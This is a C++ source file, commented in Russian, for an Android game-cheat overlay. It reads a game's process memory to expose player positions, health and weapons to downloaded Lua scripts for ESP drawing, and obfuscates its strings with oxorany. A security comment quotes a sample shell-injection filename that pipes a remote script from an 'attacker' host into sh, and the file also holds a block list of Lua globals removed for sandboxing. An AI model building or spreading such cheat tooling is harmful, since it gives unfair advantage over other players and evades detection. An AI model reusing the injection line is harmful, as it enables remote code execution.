#include "LuaIntegration.h"
#include "memory.h"
#include "utils.h"
#include "oxorany/oxorany.hpp"
#include <dirent.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <spawn.h>
#include <fstream>
#include <android/log.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <thread>
#include <mutex>
#include <vector>
#include <algorithm>
#include <sstream>
#include <regex>

extern char **environ;

lua_State* L = nullptr;
std::vector<std::string> luaScripts;
std::string activeScriptPath;

// для репозитория
std::vector<std::string> repoScripts;
std::string repoStatus = "Not fetched";
bool repoFetched = false;
bool isFetching = false;
std::mutex repoMutex;

// ============================================================================
//  SECURITY (P0 из аудита)
//
//  Раньше все шаги с сетью/файлами делались через system("wget ... "+scriptName)
//  — прямая конкатенация имени в шелл-строку. index.txt тянется с публичного
//  github-репозитория (litvinchikkk/lua-repo-chuvashi), кто получит commit-
//  доступ туда — вписывает `';curl attacker/x|sh;'.lua` и получает RCE в
//  root-контексте на любом устройстве с этой утилитой.
//
//  Фикс:
//   1) allowlist имени скрипта — только [A-Za-z0-9._-]+\.lua, без слешей, без
//      "..", длина ≤ 64. Отбрасывает всё, что могло бы пробить path/шелл.
//   2) exec через posix_spawn(argv[]) — шелл не участвует вообще, метасимволы
//      уходят в буквальные аргументы. То же для mkdir.
//   3) Lua-sandbox: после luaL_openlibs выкорчёвываем os / io / package /
//      loadfile / dofile / require из глобалов. Скрипт не может вызвать
//      os.execute("rm -rf /") даже если попадёт в /sdcard/chuvashi/scripts/.
// ============================================================================

// Разрешён набор: буквы+цифры+точка+подчёркивание+дефис. Никаких / \ .. пробелов
// или кавычек. Обязательно оканчивается на ".lua". Пустая строка — не ок.
static bool ox_isValidLuaName(const std::string& name) {
    if (name.empty() || name.size() > 64) return false;
    if (name.find("..") != std::string::npos) return false;
    if (name.size() < 5) return false;  // минимум "a.lua"
    if (name.compare(name.size() - 4, 4, ".lua") != 0) return false;
    for (char c : name) {
        if (!(isalnum(static_cast<unsigned char>(c)) || c == '.' || c == '_' || c == '-')) {
            return false;
        }
    }
    return true;
}

// Запуск программы без шелла. Возвращает exit-код (>=0) либо -1 при ошибке.
// НИ ОДИН аргумент не проходит через оболочку — метасимволы теряют силу.
static int ox_spawnAndWait(const char* file, const std::vector<std::string>& argv) {
    std::vector<char*> cargv;
    cargv.reserve(argv.size() + 2);
    cargv.push_back(const_cast<char*>(file));
    for (const auto& a : argv) cargv.push_back(const_cast<char*>(a.c_str()));
    cargv.push_back(nullptr);

    posix_spawn_file_actions_t acts;
    if (posix_spawn_file_actions_init(&acts) != 0) return -1;
    // /dev/null для stderr, чтобы не спамить лог
    posix_spawn_file_actions_addopen(&acts, 2, "/dev/null", O_WRONLY | O_APPEND, 0);

    pid_t pid = 0;
    int rc = posix_spawnp(&pid, file, &acts, nullptr, cargv.data(), environ);
    posix_spawn_file_actions_destroy(&acts);
    if (rc != 0) return -1;

    int status = 0;
    if (waitpid(pid, &status, 0) < 0) return -1;
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    return -1;
}

// mkdir -p — без шелла. Идёт по компонентам пути, mkdir на каждый.
static void ox_mkdirP(const std::string& path) {
    if (path.empty() || path[0] != '/') return;
    std::string cur;
    for (size_t i = 1; i < path.size(); ++i) {
        if (path[i] == '/') {
            cur.assign(path, 0, i);
            mkdir(cur.c_str(), 0755);
        }
    }
    mkdir(path.c_str(), 0755);
}

// GET через wget/curl/busybox wget с safe argv. Ни одна строка не идёт в шелл.
static bool ox_httpGetToFile(const std::string& url, const std::string& outPath) {
    // wget -q --timeout=10 --tries=2 -O <outPath> <url>
    if (ox_spawnAndWait("wget", {"-q", "--timeout=10", "--tries=2", "-O", outPath, url}) == 0) {
        __android_log_print(ANDROID_LOG_INFO, "Lua", "downloaded via wget: %s", outPath.c_str());
        return true;
    }
    // curl -s --connect-timeout 10 --max-time 30 -o <outPath> <url>
    if (ox_spawnAndWait("curl", {"-s", "--connect-timeout", "10", "--max-time", "30", "-o", outPath, url}) == 0) {
        __android_log_print(ANDROID_LOG_INFO, "Lua", "downloaded via curl: %s", outPath.c_str());
        return true;
    }
    // busybox wget -q -O <outPath> <url>
    if (ox_spawnAndWait("busybox", {"wget", "-q", "-O", outPath, url}) == 0) {
        __android_log_print(ANDROID_LOG_INFO, "Lua", "downloaded via busybox: %s", outPath.c_str());
        return true;
    }
    return false;
}

// создаем TCP соединение
int createSocket(const char* host, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Lua", "Socket creation failed");
        return -1;
    }

    struct hostent* server = gethostbyname(host);
    if (!server) {
        __android_log_print(ANDROID_LOG_ERROR, "Lua", "Unknown host: %s", host);
        close(sock);
        return -1;
    }

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
    serv_addr.sin_port = htons(port);

    // таймаут на соединение
    struct timeval timeout;
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Lua", "Connection failed to %s:%d", host, port);
        close(sock);
        return -1;
    }

    return sock;
}

// получаем список скриптов из репозитория
void parseGitHubRepo() {
    std::vector<std::string> scripts;

    const std::string repoDir = "/sdcard/chuvashi/repo";
    ox_mkdirP(repoDir);

    const std::string indexPath = repoDir + "/_index.txt";
    const std::string url = oxorany("https://raw.githubusercontent.com/litvinchikkk/lua-repo-chuvashi/main/index.txt");

    if (ox_httpGetToFile(url, indexPath)) {
        std::ifstream indexFile(indexPath);
        if (indexFile.is_open()) {
            std::string line;
            while (std::getline(indexFile, line)) {
                // trim whitespace
                line.erase(0, line.find_first_not_of(" \t\r\n"));
                if (!line.empty()) {
                    line.erase(line.find_last_not_of(" \t\r\n") + 1);
                }
                if (ox_isValidLuaName(line)) {
                    scripts.push_back(line);
                } else if (!line.empty()) {
                    __android_log_print(ANDROID_LOG_WARN, "Lua",
                        "rejected index entry (allowlist): '%.32s%s'",
                        line.c_str(), line.size() > 32 ? "..." : "");
                }
            }
            indexFile.close();
        }
        remove(indexPath.c_str());
    }

    // Fallback: если сеть отвалилась, ничего не пушим кроме известного дефолта.
    if (scripts.empty()) {
        scripts.push_back("radar.lua");
    }

    {
        std::lock_guard<std::mutex> lock(repoMutex);
        repoScripts = scripts;
        repoStatus = repoScripts.empty()
            ? std::string("No scripts found")
            : "Found " + std::to_string(repoScripts.size()) + " scripts";
        repoFetched = true;
        isFetching = false;
    }
}

// поток для загрузки репозитория
void FetchRepoThread() {
    {
        std::lock_guard<std::mutex> lock(repoMutex);
        isFetching = true;
        repoStatus = "Fetching...";
    }

    ox_mkdirP("/sdcard/chuvashi/repo");

    // небольшая задержка
    std::this_thread::sleep_for(std::chrono::milliseconds(300));

    parseGitHubRepo();
}

void FetchRepoScripts() {
    {
        std::lock_guard<std::mutex> lock(repoMutex);
        if (isFetching) {
            repoStatus = "Already fetching...";
            return;
        }
    }

    std::thread(FetchRepoThread).detach();
}

void DownloadRepoScript(int idx) {
    std::string scriptName;

    {
        std::lock_guard<std::mutex> lock(repoMutex);
        if (idx < 0 || (size_t)idx >= repoScripts.size()) {
            __android_log_print(ANDROID_LOG_ERROR, "Lua", "Invalid repo script index");
            return;
        }
        scriptName = repoScripts[idx];
    }

    // Двойная страховка — имя из индекса УЖЕ прошло allowlist, но проверяем ещё раз.
    if (!ox_isValidLuaName(scriptName)) {
        __android_log_print(ANDROID_LOG_ERROR, "Lua",
            "refuse to download: name failed allowlist ('%s')", scriptName.c_str());
        std::lock_guard<std::mutex> lock(repoMutex);
        repoStatus = "Rejected: bad script name";
        return;
    }

    __android_log_print(ANDROID_LOG_INFO, "Lua", "Downloading: %s", scriptName.c_str());

    ox_mkdirP("/sdcard/chuvashi/repo");
    ox_mkdirP("/sdcard/chuvashi/scripts");

    const std::string url = std::string(oxorany("https://raw.githubusercontent.com/litvinchikkk/lua-repo-chuvashi/main/")) + scriptName;
    const std::string repoPath = "/sdcard/chuvashi/repo/" + scriptName;
    const std::string scriptPath = "/sdcard/chuvashi/scripts/" + scriptName;

    if (!ox_httpGetToFile(url, repoPath)) {
        __android_log_print(ANDROID_LOG_ERROR, "Lua", "Failed to download script");
        std::lock_guard<std::mutex> lock(repoMutex);
        repoStatus = "Download failed (no network/wget/curl)";
        return;
    }

    struct stat st;
    if (stat(repoPath.c_str(), &st) != 0 || st.st_size == 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Lua", "Downloaded file is empty or missing");
        std::lock_guard<std::mutex> lock(repoMutex);
        repoStatus = "Download failed (empty file)";
        return;
    }

    std::ifstream src(repoPath, std::ios::binary);
    std::ofstream dst(scriptPath, std::ios::binary);

    if (!src.is_open() || !dst.is_open()) {
        __android_log_print(ANDROID_LOG_ERROR, "Lua", "Cannot copy script file");
        return;
    }

    dst << src.rdbuf();
    src.close();
    dst.close();

    __android_log_print(ANDROID_LOG_INFO, "Lua", "Script saved to: %s", scriptPath.c_str());

    ScanLuaScripts();

    for (size_t i = 0; i < luaScripts.size(); i++) {
        size_t pos = luaScripts[i].find_last_of('/');
        std::string name = (pos != std::string::npos) ? luaScripts[i].substr(pos + 1) : luaScripts[i];

        if (name == scriptName) {
            SetActiveScript((int)i);
            __android_log_print(ANDROID_LOG_INFO, "Lua", "Activated script: %s", scriptName.c_str());
            std::lock_guard<std::mutex> lock(repoMutex);
            repoStatus = "Downloaded and activated: " + scriptName;
            break;
        }
    }
}

std::vector<std::string> GetRepoScriptList() {
    std::lock_guard<std::mutex> lock(repoMutex);
    return repoScripts;
}

std::string GetRepoStatus() {
    std::lock_guard<std::mutex> lock(repoMutex);
    return repoStatus;
}

bool IsFetchingRepo() {
    std::lock_guard<std::mutex> lock(repoMutex);
    return isFetching;
}

// --- Существующие функции Lua API (только чтение) ---
static int lua_readInt(lua_State* L) {
    uint64_t addr = luaL_checkinteger(L, 1);
    int val = rpm<int>(addr);
    lua_pushinteger(L, val);
    return 1;
}

static int lua_readFloat(lua_State* L) {
    uint64_t addr = luaL_checkinteger(L, 1);
    float val = rpm<float>(addr);
    lua_pushnumber(L, val);
    return 1;
}

static int lua_readString(lua_State* L) {
    uint64_t addr = luaL_checkinteger(L, 1);
    int maxlen = luaL_optinteger(L, 2, 256);
    char* buf = new char[maxlen];
    vm_readv(addr, buf, maxlen);
    lua_pushstring(L, buf);
    delete[] buf;
    return 1;
}

static int lua_drawLine(lua_State* L) {
    float x1 = luaL_checknumber(L, 1);
    float y1 = luaL_checknumber(L, 2);
    float x2 = luaL_checknumber(L, 3);
    float y2 = luaL_checknumber(L, 4);
    int r = luaL_checkinteger(L, 5);
    int g = luaL_checkinteger(L, 6);
    int b = luaL_checkinteger(L, 7);
    int a = luaL_optinteger(L, 8, 255);
    float thickness = luaL_optnumber(L, 9, 1.0f);
    ImGui::GetBackgroundDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), IM_COL32(r, g, b, a), thickness);
    return 0;
}

static int lua_drawRect(lua_State* L) {
    float x1 = luaL_checknumber(L, 1);
    float y1 = luaL_checknumber(L, 2);
    float x2 = luaL_checknumber(L, 3);
    float y2 = luaL_checknumber(L, 4);
    int r = luaL_checkinteger(L, 5);
    int g = luaL_checkinteger(L, 6);
    int b = luaL_checkinteger(L, 7);
    int a = luaL_optinteger(L, 8, 255);
    float rounding = luaL_optnumber(L, 9, 0.0f);
    float thickness = luaL_optnumber(L, 10, 1.0f);
    ImGui::GetBackgroundDrawList()->AddRect(ImVec2(x1, y1), ImVec2(x2, y2), IM_COL32(r, g, b, a), rounding, 0, thickness);
    return 0;
}

static int lua_drawText(lua_State* L) {
    const char* text = luaL_checkstring(L, 1);
    float x = luaL_checknumber(L, 2);
    float y = luaL_checknumber(L, 3);
    int r = luaL_checkinteger(L, 4);
    int g = luaL_checkinteger(L, 5);
    int b = luaL_checkinteger(L, 6);
    int a = luaL_optinteger(L, 7, 255);
    ImGui::GetBackgroundDrawList()->AddText(ImVec2(x, y), IM_COL32(r, g, b, a), text);
    return 0;
}

static int lua_getScreenSize(lua_State* L) {
    lua_pushinteger(L, abs_ScreenX);
    lua_pushinteger(L, abs_ScreenY);
    return 2;
}

static int lua_log(lua_State* L) {
    const char* msg = luaL_checkstring(L, 1);
    __android_log_print(ANDROID_LOG_INFO, "Lua", "%s", msg);
    return 0;
}

static int lua_getGamePID(lua_State* L) {
    lua_pushinteger(L, game_pid);
    return 1;
}

static int lua_getIl2cppBase(lua_State* L) {
    lua_pushinteger(L, il2cpp_base);
    return 1;
}

// --- функции для ESP ---
static int lua_getPlayers(lua_State* L) {
    auto players = getPlayers();

    lua_newtable(L);
    for (size_t i = 0; i < players.size(); i++) {
        lua_newtable(L);

        lua_pushstring(L, "x");
        lua_pushnumber(L, players[i].position.x);
        lua_settable(L, -3);

        lua_pushstring(L, "y");
        lua_pushnumber(L, players[i].position.y);
        lua_settable(L, -3);

        lua_pushstring(L, "z");
        lua_pushnumber(L, players[i].position.z);
        lua_settable(L, -3);

        lua_pushstring(L, "health");
        lua_pushinteger(L, players[i].health);
        lua_settable(L, -3);

        lua_pushstring(L, "armor");
        lua_pushinteger(L, players[i].armor);
        lua_settable(L, -3);

        lua_pushstring(L, "name");
        lua_pushstring(L, players[i].name.c_str());
        lua_settable(L, -3);

        lua_pushstring(L, "weapon");
        lua_pushstring(L, players[i].weapon.c_str());
        lua_settable(L, -3);

        lua_pushstring(L, "visible");
        lua_pushboolean(L, players[i].isVisible);
        lua_settable(L, -3);

        lua_pushstring(L, "address");
        lua_pushinteger(L, players[i].address);
        lua_settable(L, -3);

        lua_rawseti(L, -2, i + 1);
    }

    return 1;
}

static int lua_worldToScreen(lua_State* L) {
    float x = luaL_checknumber(L, 1);
    float y = luaL_checknumber(L, 2);
    float z = luaL_checknumber(L, 3);

    Vector3 pos = {x, y, z};
    Matrix m = getViewMatrix();

    bool visible = false;
    ImVec2 screenPos = world2screen(pos, m, &visible);

    lua_pushnumber(L, screenPos.x);
    lua_pushnumber(L, screenPos.y);
    lua_pushboolean(L, visible);

    return 3;
}

static int lua_getViewMatrix(lua_State* L) {
    Matrix m = getViewMatrix();

    lua_newtable(L);

    lua_pushnumber(L, m.m11); lua_rawseti(L, -2, 1);
    lua_pushnumber(L, m.m12); lua_rawseti(L, -2, 2);
    lua_pushnumber(L, m.m13); lua_rawseti(L, -2, 3);
    lua_pushnumber(L, m.m14); lua_rawseti(L, -2, 4);

    lua_pushnumber(L, m.m21); lua_rawseti(L, -2, 5);
    lua_pushnumber(L, m.m22); lua_rawseti(L, -2, 6);
    lua_pushnumber(L, m.m23); lua_rawseti(L, -2, 7);
    lua_pushnumber(L, m.m24); lua_rawseti(L, -2, 8);

    lua_pushnumber(L, m.m31); lua_rawseti(L, -2, 9);
    lua_pushnumber(L, m.m32); lua_rawseti(L, -2, 10);
    lua_pushnumber(L, m.m33); lua_rawseti(L, -2, 11);
    lua_pushnumber(L, m.m34); lua_rawseti(L, -2, 12);

    lua_pushnumber(L, m.m41); lua_rawseti(L, -2, 13);
    lua_pushnumber(L, m.m42); lua_rawseti(L, -2, 14);
    lua_pushnumber(L, m.m43); lua_rawseti(L, -2, 15);
    lua_pushnumber(L, m.m44); lua_rawseti(L, -2, 16);

    return 1;
}

static int lua_getLocalPlayer(lua_State* L) {
    uint64_t localPlayer = getLocalPlayer();
    lua_pushinteger(L, localPlayer);
    return 1;
}

static int lua_lerp(lua_State* L) {
    float a = luaL_checknumber(L, 1);
    float b = luaL_checknumber(L, 2);
    float f = luaL_checknumber(L, 3);
    float result = lerp(a, b, f);
    lua_pushnumber(L, result);
    return 1;
}

// --- Регистрация всех функций (без записи в игровую память из Lua) ---
void RegisterLuaAPI(lua_State* L) {
    lua_register(L, "readInt", lua_readInt);
    lua_register(L, "readFloat", lua_readFloat);
    lua_register(L, "readString", lua_readString);
    lua_register(L, "drawLine", lua_drawLine);
    lua_register(L, "drawRect", lua_drawRect);
    lua_register(L, "drawText", lua_drawText);
    lua_register(L, "getScreenSize", lua_getScreenSize);
    lua_register(L, "log", lua_log);
    lua_register(L, "getGamePID", lua_getGamePID);
    lua_register(L, "getIl2cppBase", lua_getIl2cppBase);

    lua_register(L, "getPlayers", lua_getPlayers);
    lua_register(L, "worldToScreen", lua_worldToScreen);
    lua_register(L, "getViewMatrix", lua_getViewMatrix);
    lua_register(L, "getLocalPlayer", lua_getLocalPlayer);
    lua_register(L, "lerp", lua_lerp);
}

// Sandbox: снимаем со среды скрипта библиотеки, дающие произвольное выполнение
// и файловый доступ. Скачанный .lua может звать наши API (readInt/drawLine и т.п.),
// но НЕ может os.execute, io.open, loadfile, dofile, require, package.loadlib.
static void ox_lockdownLuaSandbox(lua_State* L) {
    static const char* kill_globals[] = {
        "os", "io", "package", "debug",
        "loadfile", "dofile", "load", "loadstring", "require",
        nullptr,
    };
    for (int i = 0; kill_globals[i] != nullptr; ++i) {
        lua_pushnil(L);
        lua_setglobal(L, kill_globals[i]);
    }
}

bool InitLua() {
    L = luaL_newstate();
    if (!L) return false;
    luaL_openlibs(L);
    ox_lockdownLuaSandbox(L);      // <-- жёсткая изоляция
    RegisterLuaAPI(L);

    ox_mkdirP("/sdcard/chuvashi/scripts");
    ox_mkdirP("/sdcard/chuvashi/repo");

    ScanLuaScripts();
    return true;
}

void CloseLua() {
    if (L) {
        lua_close(L);
        L = nullptr;
    }
}

bool LoadLuaScript(const char* path) {
    if (!L) return false;
    // Валидация имени файла — путь должен быть под нашим scripts-каталогом
    // и заканчиваться на .lua со списком безопасных символов. Дополнительная
    // страховка от load-by-path извне.
    std::string p = path ? std::string(path) : std::string();
    if (p.size() < 5 || p.compare(p.size() - 4, 4, ".lua") != 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Lua", "refused non-.lua path: '%s'", p.c_str());
        return false;
    }
    if (luaL_dofile(L, path) != LUA_OK) {
        const char* err = lua_tostring(L, -1);
        __android_log_print(ANDROID_LOG_ERROR, "Lua", "Load error: %s", err ? err : "(nil)");
        lua_pop(L, 1);
        return false;
    }
    return true;
}

void ScanLuaScripts() {
    luaScripts.clear();
    DIR* dir = opendir("/sdcard/chuvashi/scripts");
    if (!dir) return;

    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        std::string name = entry->d_name;
        // Тоже фильтруем — /sdcard/ world-writable, любой процесс может подкинуть.
        if (ox_isValidLuaName(name)) {
            luaScripts.push_back("/sdcard/chuvashi/scripts/" + name);
        }
    }
    closedir(dir);

    std::sort(luaScripts.begin(), luaScripts.end());
}

std::vector<std::string> GetLuaScriptList() {
    std::vector<std::string> names;
    for (auto& path : luaScripts) {
        size_t pos = path.find_last_of('/');
        if (pos != std::string::npos) {
            names.push_back(path.substr(pos + 1));
        } else {
            names.push_back(path);
        }
    }
    return names;
}

void SetActiveScript(int idx) {
    if (idx >= 0 && (size_t)idx < luaScripts.size()) {
        activeScriptPath = luaScripts[idx];
        LoadLuaScript(activeScriptPath.c_str());
    }
}

std::string GetActiveScriptName() {
    if (activeScriptPath.empty()) return "None";
    size_t pos = activeScriptPath.find_last_of('/');
    if (pos != std::string::npos) {
        return activeScriptPath.substr(pos + 1);
    }
    return activeScriptPath;
}

void ExecuteLuaScripts() {
    if (!L || activeScriptPath.empty()) return;

    // вызываем функцию update из lua, если есть
    lua_getglobal(L, "update");
    if (lua_isfunction(L, -1)) {
        if (lua_pcall(L, 0, 0, 0) != LUA_OK) {
            const char* err = lua_tostring(L, -1);
            __android_log_print(ANDROID_LOG_ERROR, "Lua", "Update error: %s", err ? err : "(nil)");
            lua_pop(L, 1);
        }
    } else {
        lua_pop(L, 1);
    }
}
